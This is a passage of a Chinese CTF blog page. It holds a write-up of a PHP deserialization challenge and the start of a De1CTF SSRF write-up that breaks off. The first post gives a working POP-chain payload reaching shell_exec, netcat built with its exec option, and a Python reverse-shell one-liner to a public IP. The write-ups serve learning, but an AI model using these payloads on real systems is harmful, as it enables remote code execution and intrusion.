<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="é“é©¬å†°æ²³å…¥æ¢¦æ¥">
<meta property="og:type" content="website">
<meta property="og:title" content="inanb">
<meta property="og:url" content="http://example.com/page/4/index.html">
<meta property="og:site_name" content="inanb">
<meta property="og:description" content="é“é©¬å†°æ²³å…¥æ¢¦æ¥">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="inanb">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/4/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>inanb</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="inanb" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">inanb</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">æ˜¨å¤œé›¨ç–é£éª¤ æµ“ç¡ä¸æ¶ˆæ®‹é…’</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>æ ‡ç­¾</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/26/ppppp%E5%A5%BD%E8%80%B6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="inanb">
      <meta itemprop="description" content="é“é©¬å†°æ²³å…¥æ¢¦æ¥">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="inanb">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/26/ppppp%E5%A5%BD%E8%80%B6/" class="post-title-link" itemprop="url">pppppå¥½è€¶</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2021-03-26 22:23:00" itemprop="dateCreated datePublished" datetime="2021-03-26T22:23:00+08:00">2021-03-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2021-03-30 16:40:09" itemprop="dateModified" datetime="2021-03-30T16:40:09+08:00">2021-03-30</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="é¢˜ç›®ï¼š"><a href="#é¢˜ç›®ï¼š" class="headerlink" title="é¢˜ç›®ï¼š"></a>é¢˜ç›®ï¼š</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $A1;</span><br><span class="line">    <span class="keyword">public</span> $A2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name,$param</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)</span><br><span class="line">            &#123;</span><br><span class="line">                $A3 = <span class="keyword">$this</span>-&gt;&#123;$name&#125;;</span><br><span class="line">                $A3();</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$wuhu</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;A2[$wuhu];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $B1;</span><br><span class="line">    <span class="keyword">public</span> $B2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;B1-&gt;godmi();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $C1;</span><br><span class="line">    <span class="keyword">public</span> $C2;</span><br><span class="line">    <span class="keyword">public</span> $C3;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;C2 = <span class="keyword">$this</span>-&gt;C3.<span class="keyword">$this</span>-&gt;C1;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $D1;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">FLAG</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;DDDD&#x27;</span>;</span><br><span class="line">        shell_exec(<span class="keyword">$this</span>-&gt;D1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $E1;</span><br><span class="line">    <span class="keyword">public</span> $E2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;E1-&gt;&#123;<span class="keyword">$this</span>-&gt;E2&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$ppppp = $_POST[<span class="string">&#x27;Troy3e&#x27;</span>];</span><br><span class="line">unserialize($ppppp);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="ååºåˆ—åŒ–æ­¥éª¤"><a href="#ååºåˆ—åŒ–æ­¥éª¤" class="headerlink" title="ååºåˆ—åŒ–æ­¥éª¤"></a>ååºåˆ—åŒ–æ­¥éª¤</h4><p>å¾ˆå¤šé­”æœ¯æ–¹æ³•ï¼Œéœ€è¦æ ¹æ®é€»è¾‘æ„é€ popé“¾ï¼š</p>
<p>è¿™é‡Œå”¯ä¸€å¯ä»¥è‡ªåŠ¨è°ƒç”¨çš„æ˜¯Bçš„destructï¼Œåœ¨phpè„šæœ¬ç»“æŸæ—¶è‡ªåŠ¨è°ƒç”¨</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;B1-&gt;godmi();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè°ƒç”¨äº†ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°ï¼šç±³ç¥å‡½æ•°ï¼Œå¯¹åº”çš„æ˜¯<strong>__callæ–¹æ³•</strong>ï¼Œ$nameå’Œ$paramå¯¹åº”çš„æ˜¯è°ƒç”¨ä¸­<strong>ä¸å­˜åœ¨çš„å‡½æ•°å</strong>å’Œ<strong>å‚æ•°</strong>ã€‚B(destruct)-&gt;A(call)</p>
<p>callä¸­æœ‰ä¸€ä¸ªifåˆ¤æ–­ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)</span><br><span class="line">            &#123;</span><br><span class="line">                $A3 = <span class="keyword">$this</span>-&gt;&#123;$name&#125;;</span><br><span class="line">                $A3();</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨äº†Aä¸­çš„{$name}å±æ€§ï¼Œ{}è§£é‡Šå™¨ä¼šè§£é‡Šä¸ºgodmiï¼Œå°±æ˜¯è°ƒç”¨äº†Aä¸­çš„godmiå±æ€§ï¼Œè€Œæ­¤å±æ€§ä¸å­˜åœ¨ï¼Œå¯¹åº”çš„æ˜¯</p>
<p><strong>__getæ–¹æ³•</strong>ã€‚B(destruct)-&gt;A(call)-&gt;A(get)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$wuhu</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;A2[$wuhu];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>$wuhuè¿™é‡Œè·å–çš„æ˜¯<strong>ä¸å­˜åœ¨çš„å±æ€§å</strong>ï¼Œè¿”å›çš„æ˜¯A2[godmi]ã€‚è¿™é‡Œè¦æ§åˆ¶çš„A2[godmi]å…³è”åˆ°ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name,$param</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)</span><br><span class="line">            &#123;</span><br><span class="line">                $A3 = <span class="keyword">$this</span>-&gt;&#123;$name&#125;;</span><br><span class="line">                $A3();</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $C1;</span><br><span class="line">    <span class="keyword">public</span> $C2;</span><br><span class="line">    <span class="keyword">public</span> $C3;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;C2 = <span class="keyword">$this</span>-&gt;C3.<span class="keyword">$this</span>-&gt;C1;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ§åˆ¶A2[godmi]ä¾¿å¯æ§åˆ¶A3ä¸ºCçš„å®ä¾‹åŒ–ï¼Œä»¥<strong>å‡½æ•°æ–¹æ³•è°ƒç”¨Cç±»</strong>ï¼Œè¿™é‡Œå°±ä¼šè§¦å‘__invokeæ–¹æ³•ã€‚è€Œèµ‹å€¼æ“ä½œä¸­æœ‰ä¸€ä¸ªæ‹¼æ¥ï¼ŒæŒ‰å­—ç¬¦ä¸²å½¢å¼å¤„ç†ï¼Œå¯ä»¥è§¦å‘Eçš„<strong>__toString</strong>æ–¹æ³•ã€‚</p>
<p>B(destruct)-&gt;A(call)-&gt;A(get)-&gt;A(call)-&gt;C(invoke)-&gt;E(tostring)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;E1-&gt;&#123;<span class="keyword">$this</span>-&gt;E2&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>æ§åˆ¶E1å’ŒE2ï¼Œå°±å¯ä»¥è°ƒç”¨Dä¸­çš„FLAGæ–¹æ³•äº†ï¼</p>
<p>popï¼š</p>
<p>B(destruct)-&gt;A(call)-&gt;A(call)-&gt;C(invoke)-&gt;E(tostring)-&gt;D(FLAG)-&gt;shell_exec()</p>
<p>æ„é€ ååºåˆ—åŒ–ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$c=<span class="keyword">new</span> C();</span><br><span class="line">$b=<span class="keyword">new</span> B();</span><br><span class="line">$a=<span class="keyword">new</span> A();</span><br><span class="line">$e=<span class="keyword">new</span> E();</span><br><span class="line">$d=<span class="keyword">new</span> D();</span><br><span class="line"></span><br><span class="line">$d-&gt;D1=<span class="string">&#x27;ä½ çš„å‘½ä»¤&#x27;</span>;</span><br><span class="line">$e-&gt;E1=$d;</span><br><span class="line">$e-&gt;E2=<span class="string">&quot;FLAG&quot;</span>;</span><br><span class="line">$c-&gt;C1=$e;</span><br><span class="line">$a-&gt;A2[<span class="string">&#x27;godmi&#x27;</span>]=$c;</span><br><span class="line">$b-&gt;B1=$a;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($b);</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±å·®ä¸å¤šäº†ï¼Œå¯ä»¥å‘½ä»¤æ‰§è¡Œäº†ï¼Œè™½è¯´åæ¥æ¢æˆäº†systemâ€¦â€¦</p>
<p>ä¸‹é¢æ˜¯æˆ‘ç”¨shell_execå¼¹shellçš„è¿‡ç¨‹ï¼Œå¡äº†ä¸¤å¤©æ‰çŸ¥é“è¦ç”¨å…¬ç½‘IPâ€¦â€¦æœç„¶è¿˜æ˜¯caiâ€¦â€¦</p>
<h4 id="æœåŠ¡å™¨éƒ¨ç½²netcatï¼š"><a href="#æœåŠ¡å™¨éƒ¨ç½²netcatï¼š" class="headerlink" title="æœåŠ¡å™¨éƒ¨ç½²netcatï¼š"></a>æœåŠ¡å™¨éƒ¨ç½²netcatï¼š</h4><p>ç¿»äº†å¥½å‡ ä¸ªåšå®¢æ€»ç»“çš„ï¼Œç”¨èµ·æ¥å¾ˆä¸æ»‘ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">ä¸‹è½½æºç åŒ…ï¼šwget https:&#x2F;&#x2F;sourceforge.net&#x2F;projects&#x2F;netcat&#x2F;files&#x2F;netcat&#x2F;0.7.1&#x2F;netcat-0.7.1.tar.gz</span><br><span class="line"></span><br><span class="line">è§£å‹å®‰è£…åŒ…ï¼Œtar -zxvf netcat-0.7.1.tar.gz</span><br><span class="line"></span><br><span class="line">ç§»åŠ¨æ–‡ä»¶åˆ°&#x2F;usr&#x2F;localä¸‹ï¼š</span><br><span class="line">mv netcat-0.7.1 &#x2F;usr&#x2F;local&#x2F;netcat-0.7.1</span><br><span class="line"></span><br><span class="line">é‡å‘½åï¼š</span><br><span class="line">cd &#x2F;usr&#x2F;local</span><br><span class="line">mv netcat-0.7.1 netcat</span><br><span class="line"></span><br><span class="line">.&#x2F;configure  --enable-DGAPING_SECURITY_HOLE</span><br><span class="line"></span><br><span class="line">ç¼–è¯‘ï¼šmake</span><br><span class="line"></span><br><span class="line">å®‰è£…ï¼šmake install</span><br><span class="line"></span><br><span class="line">ç¯å¢ƒå˜é‡æš‚æ—¶æœªé…ç½®æˆåŠŸï¼Œä½†ä»å¯ä½¿ç”¨ï¼Œæ­¤æ—¶ï¼š</span><br><span class="line">sudo which nc åº”å¯ä»¥çœ‹åˆ° bin&#x2F;nc</span><br><span class="line">ä½¿ç”¨bin&#x2F;ncå³å¯ä½¿ç”¨ncå‘½ä»¤</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">æˆ–è€…ï¼š</span><br><span class="line">wget https:&#x2F;&#x2F;sourceforge.net&#x2F;projects&#x2F;netcat&#x2F;files&#x2F;netcat&#x2F;0.7.1&#x2F;netcat-0.7.1.tar.gz</span><br><span class="line">tar zxvf netcat-0.7.1.tar.gz</span><br><span class="line">cd netcat-0.7.1</span><br><span class="line">.&#x2F;configure  --enable-DGAPING_SECURITY_HOLE</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>ï¼š</p>
<img src="/images/1/image-20210326222805812.png" alt="image-20210326222805812" style="zoom:80%;" />

<h4 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h4><p>è™½è¯´é¶æœºä¸Šæœ‰ncï¼Œä½†ä¸€ç›´æ²¡æœ‰æˆåŠŸâ€¦â€¦</p>
<p>è¿™é‡Œæ¨èï¼š<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5768#toc-3">https://xz.aliyun.com/t/5768#toc-3</a> å¾ˆè¯¦ç»†</p>
<p>phpä¹Ÿå¯åå¼¹ï¼Œä½†æ˜¯æ˜¯ç¬é—´åå¼¹â€¦â€¦è¿™é‡Œç”¨çš„æ˜¯pythonåå¼¹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;139.224.100.60&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>

<p>è¿œç¨‹æœåŠ¡å™¨ç›‘å¬4444ç«¯å£ï¼š</p>
<p><img src="/images/1/image-20210326223239023.png" alt="image-20210326223239023"></p>
<p>åå¼¹æˆåŠŸ</p>
<p><img src="/images/1/image-20210326223300541.png" alt="image-20210326223300541"></p>
<p>æ‰§è¡Œå‘½ä»¤cat flagå³å¯â€¦â€¦</p>
<p><strong>å¥½è€¶ï¼ç™½å«–é˜¿é‡Œäº‘æœåŠ¡å™¨çœŸé¦™ï¼ï¼ğŸ•</strong></p>
<blockquote>
<p>It is uneasy right??!</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/21/De1CTF-2019-SSRF-Me/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="inanb">
      <meta itemprop="description" content="é“é©¬å†°æ²³å…¥æ¢¦æ¥">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="inanb">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/21/De1CTF-2019-SSRF-Me/" class="post-title-link" itemprop="url">De1CTF-2019-SSRF-Me</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2021-03-21 09:55:50 / ä¿®æ”¹æ—¶é—´ï¼š11:04:57" itemprop="dateCreated datePublished" datetime="2021-03-21T09:55:50+08:00">2021-03-21</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h3><h4 id="1-é¢˜ç›®ï¼š"><a href="#1-é¢˜ç›®ï¼š" class="headerlink" title="1.é¢˜ç›®ï¼š"></a>1.é¢˜ç›®ï¼š</h4><h4 id="2-è¿‡ç¨‹ï¼š"><a href="#2-è¿‡ç¨‹ï¼š" class="headerlink" title="2.è¿‡ç¨‹ï¼š"></a>2.è¿‡ç¨‹ï¼š</h4><p>è¿›å…¥é¢˜ç›®ï¼Œå¤§æ¦‚æ˜¯ä¸€å¨pythonçš„ä»£ç â€¦â€¦æ‹–åˆ°ç¼–è¯‘å™¨é‡Œæ‰‹åŠ¨æ ¼å¼åŒ–ä¸€ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span 